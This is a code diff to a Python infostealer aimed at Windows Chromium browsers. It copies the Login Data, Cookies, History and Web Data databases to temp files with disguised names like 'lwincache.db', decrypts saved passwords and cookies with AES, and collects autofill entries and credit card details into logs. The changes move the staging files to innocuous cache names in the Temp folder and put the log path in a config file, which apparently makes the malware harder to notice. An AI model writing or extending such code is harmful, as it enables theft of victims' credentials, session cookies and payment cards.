@@ -21,6 +21,7 @@ from shutil import copy2
 from sqlite3 import connect
 from Crypto.Cipher import AES
 from datetime import datetime, timedelta
+from preferences.config import config
 
 logins = ''''''
 cookies = ''''''
@@ -81,8 +82,8 @@ def get_login_data(path, master_key, blink = False):
                 profile = path[num+1:]
                 logins += f"===============================\n\n\n{profile}:\n\n"
             login_db = f'{path}\\Login Data'
-            copy2(login_db, environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db') 
-            conn = connect(environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
+            copy2(login_db, environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\lwincache.db') 
+            conn = connect(environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\lwincache.db')
             cursor = conn.cursor()
 
         
@@ -96,7 +97,7 @@ def get_login_data(path, master_key, blink = False):
                 alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"
                 logins += alldatapass
             try:
-                remove(environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
+                remove(environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\lwincache.db')
             except:
                 pass
         except Exception as e:
@@ -118,8 +119,8 @@ def get_web_history(path, blink = False):
         HistorySQL = "SELECT url FROM visits"
         HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
         history_db = join(path, 'history')
-        copy2(history_db, environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')
-        c = connect(environ['USERPROFILE']+ '\\AppData\\Roaming\\history.db')
+        copy2(history_db, environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\hwincache.db')
+        c = connect(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\hwincache.db')
         cursor = c.cursor()
         for result in cursor.execute(HistorySQL).fetchall():
             data = cursor.execute(HistoryLinksSQL % result[0]).fetchone()
@@ -128,7 +129,7 @@ def get_web_history(path, blink = False):
                 continue
             history += result
         try:
-            remove(environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')
+            remove(environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\hwincache.db')
         except:
             pass
     except Exception as e:
@@ -145,8 +146,8 @@ def get_downloads(path, blink = False):
         downloads_db = f'{path}\\History'
         if not exists(downloads_db):
             return
-        copy2(downloads_db, dirname(path)+'\\downloads_db')
-        conn = connect(dirname(path)+'\\downloads_db')
+        copy2(downloads_db, environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\dwincache.db')
+        conn = connect(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\dwincache.db')
         cursor = conn.cursor()
         cursor.execute('SELECT tab_url, target_path FROM downloads')
         for row in cursor.fetchall():
@@ -158,7 +159,7 @@ Local Path: {row[1]}
 """
         conn.close()
         try:
-            remove(dirname(path)+'\\downloads_db')
+            remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\dwincache.db')
         except:
             pass
     except Exception as e:
@@ -174,8 +175,8 @@ def get_cookies(path, master_key, blink = False):
         cookie_db = path + '\\Network\\Cookies'
         if not exists(cookie_db):
             return None
-        copy2(cookie_db, dirname(path)+'\\cookie_db')
-        conn = connect(dirname(path)+'\\cookie_db')
+        copy2(cookie_db, environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\cwincache.db')
+        conn = connect(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\cwincache.db')
         cursor = conn.cursor()
         cursor.execute("SELECT host_key, path, datetime(expires_utc/1000000,'unixepoch') as expires_utc, name, encrypted_value FROM cookies")
         for row in cursor.fetchall():
@@ -187,7 +188,7 @@ def get_cookies(path, master_key, blink = False):
             cookies += cookie_line + "\n\n"
         conn.close()
         try:
-            remove(dirname(path)+'\\cookie_db')
+            remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\cwincache.db')
         except:
             pass
     except Exception as e:
@@ -203,8 +204,8 @@ def get_autofils(path, blink = False):
         webdata = f'{path}\\Web Data'
         if not exists(webdata):
             return
-        copy2(webdata, dirname(path)+'\\Web Data')
-        conn = connect(dirname(path)+'\\Web Data')
+        copy2(webdata, environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\wwincache.db')
+        conn = connect(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\wwincache.db')
         cursor = conn.cursor()
         cursor.execute('SELECT name, value FROM autofill')
         for row in cursor.fetchall():
@@ -216,7 +217,7 @@ Value: {row[1]}
 """
         conn.close()
         try:
-            remove(dirname(path)+'\\Web Data')
+            remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\wwincache.db')
         except:
             pass
     except Exception as e:
@@ -233,8 +234,8 @@ def get_credit_cards(path, master_key, blink = False):
         cards_db = f'{path}\\Web Data'
         if not exists(cards_db):
             return
-        copy2(cards_db, dirname(path)+'\\cards_db')
-        conn = connect(dirname(path)+'\\cards_db')
+        copy2(cards_db, environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\crwincache.db')
+        conn = connect(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\crwincache.db')
         cursor = conn.cursor()
         cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
         for row in cursor.fetchall():
@@ -249,7 +250,7 @@ Added On: {datetime.fromtimestamp(row[4])}
 """
         conn.close()
         try:
-            remove(dirname(path)+'\\cards_db')
+            remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\crwincache.db')
         except:
             pass
     except Exception as e:
@@ -332,9 +333,10 @@ def Chromium():
     Log("===========Chromium===========")
     msgInfo+="\n<b>🌐Browsers🌐</b>"
 
+    user = environ['USERPROFILE']
     local = getenv('LOCALAPPDATA')
     roaming = getenv('APPDATA')
-    pathToLogs = f"{local}\\windll\\Browsers"
+    pathToLogs = f'{user}\\{config.pathToLogs}\\Browsers'
 
     browsers = {
         'Amigo': local + '\\Amigo\\User Data',
